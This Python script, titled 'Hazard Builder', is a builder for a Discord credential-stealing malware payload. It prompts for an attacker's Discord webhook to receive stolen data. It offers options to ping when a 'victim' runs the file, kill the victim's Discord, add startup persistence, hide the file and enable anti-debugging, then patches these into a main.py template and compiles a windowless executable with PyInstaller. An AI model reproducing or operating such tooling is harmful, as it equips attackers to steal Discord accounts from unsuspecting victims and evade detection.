#creator builder: ꧁𝕆𝕧𝕖𝕣𝕡𝕠𝕨𝕖𝕣༄꧂#6996

import os
import requests
import shutil
import subprocess
import sys

from pystyle import Center, Anime, Colors, Colorate, Write, System
from colorama import init

System.Clear()
System.Title("Hazard Builder")
System.Size(146, 40)

text = """



            88""Yb 88   88 88 88     8888b.  888888 88""Yb 
            88__dP 88   88 88 88      8I  Yb 88__   88__dP 
            88""Yb Y8   8P 88 88      8I  dY 88""   88"Yb  
            88oodP `YbodP' 88 88ood8 8888Y"  888888 88  Yb 

                      :::!~!!!!!:.
                  .xUHWH!! !!?M88WHX:.
                .X*#M@$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
               ~?WuxiW*`   `"#$$$$8!!!!??!!!
             :X- M$$$$       `"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
$R@i.~~ !     :   ~$$$$$B$$en:``
?MXT@Wx.~    :     ~"##*$$$$M~             """[1:]

banner = r"""

            click the enter key to load the builder

          XX                                    XX
        XX..X                                  X..XX
      XX.....X                                X.....XX
 XXXXX.....XX                                  XX.....XXXXX
X |......XX%,.@                              @#%,XX......| X
X |.....X  @#%,.@                          @#%,.@  X.....| X
X  \...X     @#%,.@                      @#%,.@     X.../  X
 X# \.X        @#%,.@                  @#%,.@        X./  #
  ##  X          @#%,.@              @#%,.@          X   #
, "# #X            @#%,.@          @#%,.@            X ##
   `###X             @#%,.@      @#%,.@             ####'
  . ' ###              @#%.,@  @#%,.@              ###`"
    . ";"                @#%.@#%,.@                ;"` ' .
      '                    @#%,.@                   ,.
      ` ,                @#%,.@  @@                `
                          @@@  @@@                  .
"""[1:]

Anime.Fade(Center.Center(banner), Colors.red_to_yellow, Colorate.Vertical, enter=True)

System.Clear()

class Builder:
    def __init__(self) -> None:
        self.design()

        self.skeleton = Write.Print(Center.Center(text), Colors.red_to_yellow, interval = 0), print("\n"*5)
        
        self.question = Write.Input(" Do you want using the api from https://github.com/Rdimo/Discord-Webhook-Protector? [y/n] ->", Colors.red_to_yellow, interval=0.005)
        
        if self.question == 'y':
           self.skeleton = Write.Print(Center.Center(text), Colors.red_to_yellow, interval = 0), print("\n"*5)
           self.api = Write.Input(" Put your api here ->", Colors.red_to_yellow, interval=0.005)
           self.key = Write.Input(" Put your webhook protector key here ->", Colors.red_to_yellow, interval=0.005)
   
        else:
            self.skeleton = Write.Print(Center.Center(text), Colors.red_to_yellow, interval = 0), print("\n"*5)
            self.webhook = Write.Input(" Put your webhook here ->", Colors.red_to_yellow, interval=0.005)
        if not self.check_webhook(self.webhook): 
            Write.Print(Center.Center("The webhook is inavlid!"), Colors.red_to_yellow, interval = 0), print("\n"*5)
            Write.Input(" Press enter to exit...", Colors.red_to_yellow, interval=0.005)
            sys.exit()

        System.Clear()
        self.skeleton = Write.Print(Center.Center(text), Colors.red_to_yellow, interval = 0), print("\n"*5)
        self.filename = Write.Input(" Enter your FileName ->", Colors.red_to_yellow, interval=0.005)
        System.Clear()
        self.skeleton = Write.Print(Center.Center(text), Colors.red_to_yellow, interval = 0), print("\n"*5)
        self.ping = Write.Input(" Do you want receive a ping when someon ran Hazard? [y/n] ->", Colors.red_to_yellow, interval=0.005)
        System.Clear()
        self.skeleton = Write.Print(Center.Center(text), Colors.red_to_yellow, interval = 0), print("\n"*5)
        self.kill = Write.Input(" Do you want kill discord of victim when someon ran Hazard? [y/n] ->", Colors.red_to_yellow, interval=0.005)
        System.Clear()
        self.skeleton = Write.Print(Center.Center(text), Colors.red_to_yellow, interval = 0), print("\n"*5)
        self.startup = Write.Input(" Do you want put Hazard on startup? [y/n] ->", Colors.red_to_yellow, interval=0.005)
        System.Clear()
        self.skeleton = Write.Print(Center.Center(text), Colors.red_to_yellow, interval = 0), print("\n"*5)
        self.hide_self = Write.Input(" Do you want the file to hide itself after run? [y/n] ->", Colors.red_to_yellow, interval=0.005)
        System.Clear()
        self.skeleton = Write.Print(Center.Center(text), Colors.red_to_yellow, interval = 0), print("\n"*5)
        self.anti_debug = Write.Input(" Do you want active anti_debug? [y/n] ->", Colors.red_to_yellow, interval=0.005)
        
        if self.question.lower() == 'y':
            self.api = self.webhook
            
        else:
            self.key = "%key_here%"
            
        if self.ping.lower() == 'y':
            self.ping = True

        else:
            self.ping = False
        
        if self.kill.lower() == 'y':
            self.kill = True

        else:
            self.kill = False
        
        if self.startup.lower() == 'y':
            self.startup = True

        else:
            self.startup = False
            
        if self.hide_self.lower() == 'y':
            self.hide_self = True

        else:
            self.hide_self = False
            
        if self.anti_debug.lower() == 'y':
            self.anti_debug = True

        else:
            self.anti_debug = False

        self.mk_file(self.filename, self.webhook)
        
        Write.Print("Built!", Colors.red_to_yellow, interval = 0)

        Write.Input(" Press enter to exit...", Colors.red_to_yellow, interval=0.005)
        
    def check_webhook(self, webhook):
        try:
            with requests.get(webhook) as r:
                if r.status_code == 200:
                    return True
                else:
                    return False
        except:
            return False
    
    def check(self):
        required_files = {'./main.py',
                    './requirements.txt',}
        
        for file in required_files:
            if not os.path.isfile(file):
                Write.Print('{file} not found', Colors.red_to_yellow, interval = 0)
                return False

        try: 
            print(subprocess.check_output("python -V", stderr=subprocess.STDOUT))
            print(subprocess.check_output("pip -V", stderr=subprocess.STDOUT))
            
        except subprocess.CalledProcessError: 
            Write.Print("Python not found!", Colors.red_to_yellow, interval = 0)
            return False
        
        os.system('pip install --upgrade -r requirements.txt')

        os.system('cls')
        
        os.system('mode con:cols=150 lines=20')
        
        return True
    
    def mk_file(self, filename, webhook):
        
        Write.Print("Generating the exe...", Colors.red_to_yellow, interval = 0), print("\n")
        
        with open('./main.py', 'r', encoding="utf-8") as f:
            code = f.read()

        with open(f"main.py", "w", encoding="utf-8") as f:
            f.write(code.replace('%webhook_here%', webhook)
                    .replace("\"%ping_enabled%\"", str(self.ping))
                    .replace("\"%kill_enabled%\"", str(self.kill))
                    .replace("\"%startup_enabled%\"", str(self.startup))
                    .replace("\"%hide_enabled%\"", str(self.hide_self))
                    .replace("\"%anti_debug%\"", str(self.anti_debug)))
        
        self.compile(filename)
            
    def compile(self, filename):
        Write.Print("Compiling the code...", Colors.red_to_yellow, interval = 0)
        
        os.system(f'pyinstaller --clean --onefile --noconsole -i NONE -n {self.filename} main.py')

        cleans_dir = {'./__pycache__', './build'}
        cleans_file = {f'./{filename}.spec'}
        
        for clean in cleans_dir:
            try:
                if os.path.isdir(clean):
                    shutil.rmtree(clean)
                    Write.Print('{clean} removed', Colors.red_to_yellow, interval = 0)
            except Exception:
                Write.Print('{clean} not found', Colors.red_to_yellow, interval = 0)
                continue
        
        for clean in cleans_file:
            try:
                if os.path.isfile(clean):
                    os.remove(clean)
                    Write.Print('{clean} removed', Colors.red_to_yellow, interval = 0)
            except Exception:
                Write.Print('{clean} not found', Colors.red_to_yellow, interval = 0)
                continue
        
if __name__ == '__main__':
    init()

    if os.name != "nt":
        os.system("clear")
    else:
        os.system('mode con:cols=146 lines=40')
        os.system("cls")

    Builder()
